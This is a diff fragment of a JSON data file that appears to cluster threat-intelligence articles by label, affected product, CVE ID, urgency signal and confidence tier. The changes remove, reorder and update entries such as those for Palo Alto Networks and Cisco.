-      "label": "vulnerability disclosure targeting Palo Alto Networks",
-      "dominant_features": {
-        "threat_categories": [
-          "vulnerability_disclosure",
-          "malware"
-        ],
-        "affected_industries": [
-          "healthcare"
-        ],
-        "affected_products": [
-          "Palo Alto Networks"
-        ],
-        "cve_ids": [
-          "CVE-2026-0300"
-        ],
-        "urgency_signals": [
-          "preauth_unauth",
-          "cisa_kev"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research",
-          "tier_1_primary_research"
-        ]
-      },
-      "cluster_count": 5,
-      "article_count": 5,
-      "cohesion": 0.321,
-      "cluster_ids": [
-        "da2bf7e408",
-        "26471ead7e",
-        "bbf47cae0b",
-        "f72dc2efba",
-        "ab51d3dc5d"
-      ]
-    },
-    {
-      "label": "vulnerability disclosure targeting GitHub",
-      "dominant_features": {
-        "threat_categories": [
-          "vulnerability_disclosure",
-          "malware"
-        ],
-        "affected_products": [
-          "GitHub"
-        ],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_2_operator",
-          "tier_4_news"
-        ]
-      },
-      "cluster_count": 4,
-      "article_count": 6,
-      "cohesion": 0.306,
-      "cluster_ids": [
-        "2eb9132451",
-        "029fcc1f63",
-        "09f484b295",
-        "cf2449e818"
-      ]
-    },
-    {
       "label": "active exploitation targeting Cisco",
       "dominant_features": {
         "threat_categories": [
           "active_exploitation",
           "vulnerability_disclosure",
-          "zero_day"
+          "zero_day",
+          "nation_state"
         ],
         "affected_products": [
           "Cisco"
@@ -8699,45 +8671,53 @@
           "vulnerability_disclosure"
         ],
         "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "cluster_count": 3,
-      "article_count": 11,
-      "cohesion": 0.673,
-      "cluster_ids": [
-        "63ea56af01",
-        "8fd391b96b",
-        "03f477fe86"
-      ]
-    },
-    {
-      "label": "malware affecting government public sector",
-      "dominant_features": {
-        "threat_categories": [
-          "malware",
-          "nation_state"
-        ],
-        "affected_industries": [
-          "government_public_sector"
-        ],
-        "geographic_scope": [
-          "ukraine"
-        ],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
+          "tier_4_news",
           "tier_1_primary_research"
         ]
       },
-      "cluster_count": 3,
-      "article_count": 5,
-      "cohesion": 0.328,
+      "cluster_count": 4,
+      "article_count": 12,
+      "cohesion": 0.527,
       "cluster_ids": [
-        "e605f0e929",
-        "55d60e5654",
-        "03647dbe9e"
+        "63ea56af01",
+        "8fd391b96b",
+        "03f477fe86",
+        "bb0ffb2b81"
+      ]
+    },
+    {
+      "label": "vulnerability disclosure targeting Palo Alto Networks",
+      "dominant_features": {
+        "threat_categories": [
+          "vulnerability_disclosure",
+          "malware"
+        ],
+        "affected_products": [
+          "Palo Alto Networks"
+        ],
+        "cve_ids": [
+          "CVE-2026-0300"
+        ],
+        "urgency_signals": [
+          "cisa_kev",
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research",
+          "tier_1_primary_research"
+        ]
+      },
+      "cluster_count": 4,
+      "article_count": 4,
+      "cohesion": 0.318,
+      "cluster_ids": [
+        "da2bf7e408",
+        "26471ead7e",
+        "f72dc2efba",
+        "ab51d3dc5d"
       ]
     },
     {
@@ -8756,27 +8736,6 @@
       "cluster_ids": [
         "b45ac0ca64",
         "af7f3f5c0b"
-      ]
-    },
-    {
-      "label": "vulnerability disclosure activity",
-      "dominant_features": {
-        "threat_categories": [
-          "vulnerability_disclosure"
-        ],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 3,
-      "cohesion": 0.429,
-      "cluster_ids": [
-        "b6e5532bde",
-        "f5e012a226"
       ]
     },
     {
